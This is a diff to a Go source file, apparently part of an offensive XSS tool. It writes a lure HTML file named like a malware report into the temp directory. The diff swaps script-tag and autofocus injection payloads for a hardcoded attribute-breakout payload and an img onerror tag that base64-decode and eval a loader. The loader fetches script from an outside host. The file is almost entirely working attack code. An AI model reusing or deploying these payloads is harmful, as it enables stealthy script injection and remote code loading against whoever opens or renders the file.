@@ -1,7 +1,6 @@
 package xss
 
 import (
-	"encoding/base64"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -11,9 +10,8 @@ import (
 func injectIntoFileContent(payload XSSPayload) {
 	tempDir := os.TempDir()
 
-	// Generar loader base64 para los payloads
-	jsLoader := fmt.Sprintf(`var a=document.createElement("script");a.src="%s";document.body.appendChild(a);`, payload.CallbackURL)
-	b64Loader := base64.StdEncoding.EncodeToString([]byte(jsLoader))
+	// Payload específico
+	specificPayload := `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`
 
 	// 1. Crear archivo HTML completo
 	htmlFile := filepath.Join(tempDir, fmt.Sprintf("malware_report_%s.html", payload.ID[:8]))
@@ -38,18 +36,13 @@ func injectIntoFileContent(payload XSSPayload) {
         <p>Status: Analyzing...</p>
         
         <!-- XSS Payload -->
-        <script>
-            var a=document.createElement("script");a.src="%s";document.body.appendChild(a);
-        </script>
-        
-        <!-- Alternative XSS -->
-        <img src="x" id="%s" onerror="eval(atob(this.id))">
-        
-        <!-- Input XSS -->
-        <input onfocus="eval(atob(this.id))" id="%s" autofocus>
+        %s
+
+        <!-- Clean Tag -->
+        <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
     </div>
 </body>
-</html>`, payload.ID, payload.CallbackURL, b64Loader, b64Loader)
+</html>`, payload.ID, specificPayload)
 
 	err := os.WriteFile(htmlFile, []byte(htmlContent), 0644)
 	_ = err
